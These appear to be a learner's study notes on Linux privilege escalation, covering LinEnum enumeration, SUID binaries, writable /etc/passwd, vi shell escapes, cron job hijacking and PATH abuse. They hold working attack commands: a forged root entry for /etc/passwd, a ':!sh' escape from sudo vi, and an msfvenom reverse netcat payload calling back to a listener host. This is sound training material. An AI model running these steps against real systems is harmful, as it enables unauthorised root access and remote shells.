Privilege Escalation
-going from lower permission to a higher permission
-exploit a design flaw or configuration 
Uses: 
-Reset passwords
-Bypass access controls to compromise protected data
-Edit software configs
-Enable persistence
-Change privilege of users

Direction of privilege Esc:
1. Horizontal: expand reach over the compromised system, take over different user with the same privilege level
-inherit files and access 
2. Vertical: attempt to gain higher privileges or access with an existing account 
-hijacking an account with admin or root privileges

Enumeration
-LinEnum: simple bash script that performs commmon commands related to privilege escalation
-how to get linEnum on target machine
1. start python web server using "python3 -m http.server 8000"
2. use wget on the target machine with local IP 
3. change the file executable using "chmod +x [file.sh]"
-running LinEnum
-run script
-LinEnum output sections:
read/write sensitive files: look at permission to look sensitive files
SUID files: (set owner user ID up to execution) - special permission that runds with permissions of whoever owns it
Crontab contents: schedule commands at a specific time

-Practical
-shells
cat /etc/shells
-cron
cat /etc/crontab
-critical files
cat /etc/passwd

Abusing SUID/GUID Files
-SUID =  run file with the permissions of the owner/group
-privileges (rwx-rxw-rwx) user, group, others - read, write, execute'
-maximum number is 7
-extra bit 4: SUID (user)
-extra bit 2: SGID (group)
Finding SUID binaries
find / -perm -u=s -type f 2>/dev/null
find - initiates the find command
/ - searches the whole file system
-perm - searches for files with specific permissions
-u=s - any of the permission bits mode are set for the file, symbolic modes accepted
-type f - only search for files
2>/dev/null - suppresses errors

Exploiting Writable /etc/passwd
-/etc/passwd: stores user account information 
-plain text file
-useful info: userId, groupId, home directory, shell and more
-general read permission
-root/superuser write access
-fields are separated by a ':'
1. username
2. password: x  indicates encrypted passwords stored in /etc/shadow file
3. user ID (UID): each user is assigned a user ID (1-99: pedefined accounts)(100- 999: reserved by system for admin and sys accounts/groups)
4. Group ID (GID): primary group ID (stored in /etc/group/file)
5. User ID info: add extra information about users - name, phone number etc
6. Home directory: absolute path to the directory the user will be in when logged
7. Command/shell: absoulte path of a command or shell (/bin/bash)
Exploit: change pw hash, set UID, set GID, Shell to root etc

Practical
openssl passwd -1 -salt [salt] [password]
username:passwordhash:0:0:root:/root:/bin/bash

Escaping Vi Editor
-sudo -l: list
-sudo vi: open vi as root
:!sh - open a shell 

Exploiting Crontab
-cron daemon: long-running process that executes commands at specific dates and times
-schedule activities either as one-time evens or recurring tasks
cat /etc/crontab
# = id
m = minute
h = hour
dom = Day of month
mon = month
dow = Day of week
user = what user the command will run as
command = what command should be run
Exploit: 
-look for root privileges
-local machine netcat listener: msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
-target machine run: cat /etc/crontab
-find file to target copy file to the correct directory with the same name

PATH
-an environment variable in Linux and Unix-like OS
-view path using = echo $PATH
-Privesc: rewrite the PATH variable to a location  - so the SUID binary calls the system shell to run an executable
-run with same privileges as owner of the SUID file
